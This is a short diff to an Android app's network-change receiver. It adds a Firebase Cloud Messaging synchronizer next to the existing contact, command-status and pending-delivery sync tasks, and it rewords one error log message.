@@ -7,6 +7,7 @@ import android.util.Log;
 
 import com.theah64.xrob.asynctasks.CommandStatusesSynchronizer;
 import com.theah64.xrob.asynctasks.ContactsSynchronizer;
+import com.theah64.xrob.asynctasks.FCMSynchronizer;
 import com.theah64.xrob.asynctasks.PendingDeliverySynchronizer;
 import com.theah64.xrob.utils.APIRequestGateway;
 
@@ -24,18 +25,18 @@ public class NetworkChangeReceiver extends BroadcastReceiver {
     public void onReceive(final Context context, Intent intent) {
         Log.i(X, "Network changed...");
 
-
         new APIRequestGateway(context, new APIRequestGateway.APIRequestGatewayCallback() {
             @Override
             public void onReadyToRequest(String apiKey) {
                 new ContactsSynchronizer(context, apiKey).execute();
                 new CommandStatusesSynchronizer(context, apiKey).execute();
                 new PendingDeliverySynchronizer(context, apiKey).execute();
+                new FCMSynchronizer(context, apiKey).execute();
             }
 
             @Override
             public void onFailed(String reason) {
-                Log.e(X, "Failed to sync contacts : " + reason);
+                Log.e(X, "ERROR : " + reason);
             }
         });
 
